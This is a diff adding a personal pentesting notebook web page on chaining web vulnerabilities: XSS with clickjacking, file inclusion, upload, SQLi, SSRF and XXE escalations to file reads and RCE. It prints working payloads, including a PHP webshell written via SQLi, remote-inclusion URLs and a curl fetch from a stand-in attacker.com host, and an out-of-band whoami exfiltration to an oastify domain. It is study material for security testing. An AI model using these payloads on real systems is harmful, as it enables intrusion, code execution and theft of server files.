@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personal - My Notebook Website</title>
+    <link rel="stylesheet" href="../Static/styles.css">
+    <img src="img/logo.jpg" alt="Logo" class="logo">
+</head>
+<body>
+    <header>
+        <h1>Welcome to My Notebook</h1>
+        <nav>
+            <ul>
+                <li><a href="../Main.html">Home</a></li>
+            </ul>    
+        </nav>
+        <h4>Vulnerabilities chains</h4>
+    </header>
+    <h1 id="self-xss-cickjacking">Self XSS + Cickjacking</h1>
+    <ul>
+    <li><p>If you have identified an XSS attack that requires a user to click on some element to trigger the XSS and the page is vulnerable to clickjacking, you could abuse it to trick the user into clicking the button/link.</p>
+    <ul>
+    <li><p>Example:
+    You found a self XSS in some private details of the account (details that only you can set and read). The page with the form to set these details is vulnerable to Clickjacking and you can prepopulate the form with the GET parameters.</p>
+    <p>__An attacker could prepare a Clickjacking attack to that page prepopulating the form with the XSS payload and tricking the user into Submit the form. So, when the form is submitted and the values are modified, the user will execute the XSS.</p>
+    </li>
+    </ul>
+    <h1 id="lfi-rfi-using-php-wrappers-protocols">LFI / RFI using PHP wrappers &amp; protocols</h1>
+    </li>
+    <li><p>YOu should SEE  <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#remote-file-inclusion">HackTricks</a></p>
+    <h1 id="remote-file-inclusion-rfi-to-rce">Remote File Inclusion (RFI) TO RCE</h1>
+    </li>
+    <li><p>In php this is disable by default because <code>allow_url_include</code>
+    is <strong>Off</strong>. It must be <strong>On</strong> for it to work, and in that case you could include a PHP file from your server and get RCE:</p>
+    <pre><code>http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=http://atacker.<span class="hljs-keyword">com</span>/mal.php
+    http://example.<span class="hljs-keyword">com</span>/<span class="hljs-built_in">index</span>.php?page=\\attacker.<span class="hljs-keyword">com</span>\shared\mal.php 
+    </code></pre><h1 id="local-file-inclusion-lfi-to-rce">Local File Inclusion (LFI) TO RCE</h1>
+    </li>
+    <li><p><strong>Via Apache/Nginx log file</strong> </p>
+    <ul>
+    <li><p>If the Apache or Nginx server is vulnerable to LFI inside the include function you could try to access to /var/log/apache2/access.log
+    or /var/log/nginx/access.log
+    , set inside the <code>user agent</code> or inside a GET parameter a php shell like <code>&lt;?php system($_GET[&#39;c&#39;]); ?&gt;</code> and include tha file </p>
+    </li>
+    <li><p>and for <a href="https://book.hacktricks.xyz/pentesting-web/file-inclusion#lfi2rce">MORE</a>    </p>
+    </li>
+    </ul>
+    <h1 id="from-file-upload-to-other-vulnerabilities">From File upload to other vulnerabilities</h1>
+    </li>
+    <li><p>Set filename to <code>../../../tmp/lol.png</code> and try to achieve a path traversal</p>
+    </li>
+    <li><p>Set filename to <code>sleep(10)-- -.jpg</code> and you may be able to achieve a SQL injection</p>
+    </li>
+    <li><p>Set filename to <code>&lt;svg onload=alert(document.domain)&gt;</code> to achieve a XSS</p>
+    </li>
+    <li><p>Set filename to <code>; sleep 10;</code> to test some command injection</p>
+    </li>
+    <li><p>Specially crafted PDFs to XSS: The following page present how to inject PDF data to obtain JS execution. <a href="https://portswigger.net/research/portable-data-exfiltration">here</a></p>
+    </li>
+    <li><p><strong>Here’s a top 10 list of things that you can achieve by uploading</strong></p>
+    <ul>
+    <li><p>ASP / ASPX / PHP5 / PHP / PHP3: <strong>Webshell / RCE</strong></p>
+    </li>
+    <li><p>SVG: <strong>Stored XSS / SSRF / XXE</strong></p>
+    </li>
+    <li><p>GIF: <strong>Stored XSS / SSRF</strong></p>
+    </li>
+    <li><p>CSV: <strong>CSV injection</strong></p>
+    </li>
+    <li><p>XML: <strong>XXE</strong></p>
+    </li>
+    <li><p>AVI: <strong>LFI / SSRF</strong></p>
+    </li>
+    <li><p>HTML / JS : <strong>HTML injection / XSS / Open redirect</strong></p>
+    </li>
+    <li><p>PNG / JPEG: <strong>Pixel flood attack (DoS)</strong></p>
+    </li>
+    <li><p>ZIP: <strong>RCE via LFI / DoS</strong></p>
+    </li>
+    <li><p>PDF / PPTX: <strong>SSRF / BLIND XXE</strong> </p>
+    </li>
+    </ul>
+    </li>
+    </ul>
+    <h1 id="from-xss-to-other-vulnerabilities">From XSS to other vulnerabilities</h1>
+    <ul>
+    <li><p><strong>XSS + Clickjacking</strong>   </p>
+    <ul>
+    <li><p>If you have identified an XSS attack that requires a user to click on some element to trigger the XSS and the page is vulnerable to clickjacking, you could abuse it to trick the user into clicking the button/link.</p>
+    </li>
+    <li><p>EXample:
+    You found a <code>self XSS</code> in some private details of the account (details that only you can set and read). The page with the form to set these details is vulnerable to Clickjacking and you can prepopulate the form with the GET parameters.</p>
+    </li>
+    <li><p>__An attacker could prepare a Clickjacking attack to that page prepopulating the form with the XSS payload and tricking the user into Submit the form. So, when the form is submitted and the values are modified, the user will execute the XSS.</p>
+    </li>
+    </ul>
+    </li>
+    <li><p><strong>XSS to SSRF</strong></p>
+    <ul>
+    <li><p>Got XSS on a site that uses caching? Try upgrading that to SSRF through Edge Side Include Injection with this payload:
+    <code>&lt;esi:include src=&quot;http://yoursite.com/capture&quot; /&gt;</code> Use it to bypass cookie restrictions, XSS filters and much more!.</p>
+    </li>
+    <li><p>XSS in Admin Panel: Let&#39;s say there&#39;s an admin panel vulnerable to XSS. An attacker could inject a malicious script into the admin&#39;s session, allowing them to manipulate requests made by the admin. The attacker could inject code that sends requests to internal resources, effectively turning the XSS vulnerability into an SSRF.</p>
+    </li>
+    <li><p>XSS in User-Submitted Content: Consider a website where users can submit comments or messages, and these are displayed to other users without proper sanitization. An attacker could inject a malicious script into their own comment, which, when viewed by another user (possibly an admin), triggers an SSRF attack. For example, the script could make requests to internal services or sensitive endpoints.</p>
+    </li>
+    <li><p>XSS in Client-Side Frameworks: Many modern web applications use client-side frameworks like React or Angular. If there&#39;s an XSS vulnerability in the client-side code, an attacker could inject malicious scripts that manipulate requests sent by the client.<code>This could lead to SSRF if the attacker crafts the script to make requests to internal resources.</code></p>
+    </li>
+    <li><p>An attacker could craft a malicious URL containing XSS payload, which, when clicked by a (user with access to sensitive #ADMIN#)resources, triggers an SSRF attack.</p>
+    </li>
+    </ul>
+    </li>
+    <li><p><strong>XSS to LFI</strong></p>
+    <ul>
+    <li><p>An attacker might combine XSS with other vulnerabilities, such as <strong>path traversal or insecure file permissions,</strong> to escalate the attack to LFI.</p>
+    </li>
+    <li><p>If an application includes user-controlled data into server-side include (SSI) directives or file paths without proper input validation or output encoding, an attacker could inject XSS payload to manipulate these inputs.</p>
+    <ul>
+    <li><p>// Assuming vulnerable code includes user-controlled data into file paths</p>
+    <pre><code>  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">     
+      <span class="hljs-keyword">var</span> img = <span class="hljs-keyword">new</span> Image();
+      img.src = <span class="hljs-string">"/path/to/image/"</span> + userControlledData;
+      </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>```
+         If userControlledData is not properly sanitized, an attacker could inject a path traversal payload like ../../../etc/passwd, leading to LFI.
+    </code></pre></li>
+    </ul>
+    </li>
+    <li><p>Abusing JavaScript APIs: In modern web applications, JavaScript APIs like Fetch API or XMLHttpRequest can be used to make requests to arbitrary locations, including local files.</p>
+    <pre><code>     fetch(<span class="hljs-string">'https://example.com/endpoint?param='</span> + userControlledData)
+         .then(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.text())
+         .then(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-built_in">console</span>.log(data));
+         ==================================
+         ==================================
+           <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+           x=<span class="hljs-keyword">new</span> XMLHttpRequest;
+           x.onload=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>{
+           <span class="hljs-built_in">document</span>.write(<span class="hljs-keyword">this</span>.responseText)
+           };
+           x.open(<span class="hljs-string">"GET"</span>,<span class="hljs-string">"file:///etc/passwd"</span>);
+           x.send();
+           </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+    </code></pre></li>
+    <li><p>Attacking Server-Side Components: If the XSS vulnerability exists in a context where server-side components are involved (e.g., server-side templates), an attacker could inject payloads that cause the server to include local files.</p>
+    <pre><code>     <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="actionscript">
+         <span class="hljs-comment">// Assuming server-side template includes user-controlled data without proper validation</span>
+         <span class="hljs-keyword">var</span> username = <span class="hljs-string">"'; include('/etc/passwd'); //"</span>;
+         </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+    </code></pre></li>
+    </ul>
+    </li>
+    </ul>
+    <h1 id="from-sqli-to-other-vulnerabilitie">From SQLi to other vulnerabilitie</h1>
+    <ul>
+    <li><p><strong>SQLi lead to LFI</strong>          </p>
+    <ul>
+    <li><p>SQL injection payload that can be used to read the “/etc/passwd” file on the server:</p>
+    <pre><code>' <span class="hljs-built_in">UNION</span> <span class="hljs-built_in">SELECT</span> load_file('/etc/passwd') <span class="hljs-meta">#</span>
+    </code></pre><p>More <a href="https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/LFI-via-load_file-function/README.md">resources</a> </p>
+    </li>
+    </ul>
+    </li>
+    </ul>
+    <ul>
+    <li><p><strong>SQLi lead to RCE</strong> </p>
+    <ul>
+    <li><p>Uploading a PHP shell to the server</p>
+    <pre><code>  <span class="hljs-string">' UNION SELECT '</span><span class="hljs-meta">&lt;?</span>php <span class="hljs-keyword">system</span>($_GET[<span class="hljs-string">'cmd'</span>]); <span class="hljs-meta">?&gt;</span><span class="hljs-string">' INTO OUTFILE '</span>/var/www/html/<span class="hljs-built_in">shell</span>.php<span class="hljs-string">' #</span>
+    </code></pre></li>
+    </ul>
+    </li>
+    </ul>
+    <pre><code>- If <span class="hljs-keyword">the</span> application interacts <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> underlying <span class="hljs-keyword">system</span> through commands <span class="hljs-keyword">or</span> <span class="hljs-built_in">shell</span> operations based <span class="hljs-keyword">on</span> <span class="hljs-title">user-controlled</span> <span class="hljs-title">input</span> <span class="hljs-title">retrieved</span> <span class="hljs-title">via</span> <span class="hljs-title">SQL</span> <span class="hljs-title">queries</span>, <span class="hljs-title">an</span> <span class="hljs-title">attacker</span> <span class="hljs-title">could</span> <span class="hljs-title">leverage</span> <span class="hljs-title">SQLi</span> <span class="hljs-title">to</span> <span class="hljs-title">inject</span> <span class="hljs-title">malicious</span> <span class="hljs-title">commands</span>.
+    
+           ```SELECT * FROM products WHERE id=<span class="hljs-number">1</span>; $(curl -s <span class="hljs-keyword">https</span>://attacker.com/malicious_script.sh)```
+    </code></pre><h1 id="from-ssrf-to-other-vulnerabilitie">From SSRF to other vulnerabilitie</h1>
+    <ul>
+    <li><strong>SSRF to LFI</strong> </li>
+    </ul>
+    <pre><code>- The <span class="hljs-keyword">next</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> test dangerous URL schemas such as <span class="hljs-keyword">file</span>:/// , dict:// , ftp:// <span class="hljs-keyword">and</span> gopher:// , but i was lucky enough <span class="hljs-keyword">and</span> i was able <span class="hljs-keyword">to</span> read internal files from <span class="hljs-keyword">file</span>:/// scheme.
+    
+    - Direct <span class="hljs-keyword">Access</span> <span class="hljs-keyword">to</span> Local Files: The attacker crafts a URL pointing <span class="hljs-keyword">to</span> a local <span class="hljs-keyword">file</span> <span class="hljs-keyword">on</span> the server<span class="hljs-symbol">'s</span> filesystem using <span class="hljs-keyword">file</span> scheme URLs.
+         ```SSRF Payload: <span class="hljs-keyword">file</span>:///etc/passwd```
+    
+    
+    - By specifying the path <span class="hljs-keyword">to</span> the NGINX <span class="hljs-keyword">configuration</span> <span class="hljs-keyword">file</span> (/etc/nginx/nginx.conf <span class="hljs-keyword">in</span> this example), the attacker can retrieve sensitive <span class="hljs-keyword">configuration</span> details, potentially revealing server secrets <span class="hljs-keyword">or</span> exposing misconfigurations. 
+          ```SSRF Payload: <span class="hljs-keyword">file</span>:///etc/nginx/nginx.conf```
+    </code></pre><ul>
+    <li><p><strong>SSRF to RCE</strong></p>
+    <ul>
+    <li><p>you can by <a href="https://github.com/tarunkant/Gopherus">Gopherus</a> tool.</p>
+    </li>
+    <li><h3 id="ssrf-with-command-injection-">SSRF with Command Injection :</h3>
+    <p>It is possible to use SSRF that return the command output inside an out of band connection as follows.</p>
+    <pre><code>   url=<span class="hljs-string">http:</span><span class="hljs-comment">//zad8nb8tb7dst2yohw0br7rr6ich07ow.oastify.com?`whoami`</span>
+         User-<span class="hljs-string">Agent:</span> () { :; }; <span class="hljs-regexp">/bin/</span>nslookup $(whoami).zad8nb8tb7dst2yohw0br7rr6ich07ow.oastify.com
+    </code></pre></li>
+    </ul>
+    <h1 id="from-xxe-to-other-vulnerabilitie">From XXE to other vulnerabilitie</h1>
+    </li>
+    <li><p><strong>XXE to LFI</strong></p>
+    <ul>
+    <li><p>When the tester has identified a vulnerable entry point . He can try to disclose local files by replacing the from value with the content of a sensitive file (e.g. /etc/passwd).</p>
+    <pre><code>  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span><span class="hljs-meta">?&gt;</span></span>
+      <span class="hljs-meta">&lt;!DOCTYPE xxeinjection [ &lt;!ENTITY newfrom SYSTEM "file:///etc/passwd"&gt; ]&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">searchForm</span>&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>&amp;newfrom;<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">searchForm</span>&gt;</span>
+    </code></pre></li>
+    </ul>
+    </li>
+    <li><p><strong>XXE to SSRF</strong></p>
+    <ul>
+    <li><p>When an application performs data transfer using XML, the request can be intercepted and forwarded to an internal host as follow.</p>
+    <pre><code><span class="xml">  <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+      <span class="hljs-meta">&lt;!DOCTYPE foo [ &lt;!ENTITY newfrom SYSTEM "http://</span></span><span class="hljs-template-variable">{internal_host}</span><span class="xml"><span class="hljs-meta">/..."&gt; ]&gt;</span>
+      <span class="hljs-tag">&lt;<span class="hljs-name">searchForm</span>&gt;</span>
+         <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>&amp;newfrom;<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">searchForm</span>&gt;</span>  </span>
+    </code></pre></li>
+    </ul>
+    </li>
+    <li><p><strong>XXE to RCE</strong></p>
+    <ul>
+    <li>The idea is that you provide a reference to <code>expect://id</code> pseudo URI for the XML external entity, and PHP will execute id and return the output of the command for external entity substitution.                               </li>
+    </ul>
+    </li>
+    </ul>
+    <pre><code><span class="hljs-bullet">- </span>another use by php wrapper  [<span class="hljs-string">Watch</span>](<span class="hljs-link">https://youtu.be/Gz4iPauycKs?si=T7ZbqWPSOppL94hx</span>) .
+    </code></pre>
+
+    <footer>
+        <p>&copy;hu1k0 Notebook Website</p>
+    </footer>
+</body>
+</html>
